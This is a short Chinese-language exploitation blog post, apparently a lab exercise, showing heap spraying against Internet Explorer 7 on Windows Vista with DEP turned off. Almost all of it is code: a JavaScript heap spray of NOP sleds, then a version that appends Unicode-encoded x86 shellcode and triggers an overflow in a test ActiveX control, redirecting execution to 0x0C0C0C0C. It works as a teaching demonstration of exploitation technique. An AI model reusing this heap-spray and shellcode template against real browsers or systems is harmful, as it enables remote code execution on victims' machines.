---
layout:		post
title:		利用Heap Spray技术定位内存地址
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows Vista Ultimate sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>Flash Player ActiveX: 9.0.262  
>注意: 关闭系统DEP  
<!-- more -->


新建test.html, 贴入以下代码

```
<html>  
<body>  
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>  
<script>  
var nops = unescape("%u9090%u9090");
while (nops.length < 0x100000/2)
	nops += nops;
nops=nops.substring(0,0x100000/2-32/2-4/2-2/2-2);
nops=unescape("%u8281%u8182")+nops;
var memory = new Array();
for (var i=0;i<200;i++)
	memory[i] += nops;
test.test("\u9090\u9090");
</script>  
</body>  
</html>
```

OD附加上去, 在内存检索0x81828281, 可以看到申请的内存块

![](/assets/img/exploit/2017-12-30-break-aslr-by-heap-spray/0x00.png)

重启后

![](/assets/img/exploit/2017-12-30-break-aslr-by-heap-spray/0x01.png)

填充shellcode

```
<html>  
<body>  
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>  
<script>  
var nops = unescape("%u9090%u9090");
var shellcode = "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50\u90d7";
while (nops.length < 0x100000)
	nops += nops;
nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);
nops = nops + shellcode;
var memory = new Array();
for (var i=0;i<200;i++)
	memory[i] += nops;
var s = "\u9090";
while(s.length < 54)
	s += "\u9090";
s += "\u0C0C\u0C0C";
test.test(s);
</script>  
</body>  
</html>
```

pwn~

![](/assets/img/exploit/2017-12-30-break-aslr-by-heap-spray/0x02.png)